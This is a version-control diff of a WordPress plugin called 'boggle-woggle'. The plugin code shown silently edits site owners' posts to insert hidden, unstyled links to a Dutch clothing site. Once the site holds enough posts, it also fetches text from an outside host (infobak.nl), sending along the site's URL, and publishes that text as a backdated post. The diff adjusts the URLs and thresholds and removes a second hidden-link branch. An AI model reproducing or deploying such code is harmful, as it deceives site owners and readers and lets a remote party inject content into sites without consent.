79ec110896d374fa434756ac49248332e1a751e4
EnergieBoer <EnergieBoer@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2014-09-11 08:56:22 +0000

    updboggle
    git-svn-id: https://plugins.svn.wordpress.org/boggle-woggle/trunk@987093 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- boggle-woggle.php
+++ boggle-woggle.php
@@ -673,7 +673,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                                 $pos4 = strposnth($content , " ",4);
                                 $pos5 = strposnth($content , " ",5);
                                 $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                                $content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/winkels/primark-nederland-goedkope-kleding/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
                                 $my_post = array(
                                     'ID'           => $last_id,
                                     'post_content' => $content
@@ -687,7 +687,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                 $url = home_url();
                 $total = wp_count_posts()->publish;
                 if (get_option('bw_gpadded')=='0') {
-                        if ($total>60) {
+                        if ($total>40) {
                                 $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
                                 if (boggleStartsWith($tmpstring, 'empty')==false) {
                                   $my_post = array(
@@ -695,28 +695,11 @@ add_option("bw_global_excludelist", '', '', 'yes');
                                         'post_content'  => $tmpstring,
                                         'post_status'   => 'publish',
                                         'post_author'   => 1,
-                                        'post_date'     => '2014-02-03'
+                                        'post_date'     => '2014-05-03'
                                   );
                                   wp_insert_post( $my_post );
                                   update_option( 'bw_gpadded', '1' );
                                 }
-                        } elseif ($total>10) {
-								$last = wp_get_recent_posts('4');
-								$last_id = $last['3']['ID'];
-								$post_7 = get_post($last_id);
-								if (is_null($post_7) == false) {
-										$content = $post_7->post_content;
-										$pos4 = strposnth($content , " ",4);
-										$pos5 = strposnth($content , " ",5);
-										$poslen = $pos5 - $pos4 - 1;
-		                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-										$my_post = array(
-											'ID'           => $last_id,
-											'post_content' => $content
-										);
-										wp_update_post( $my_post );
-								}
-								update_option( 'bw_gpadded', '1' );
                         }
                 }
         }
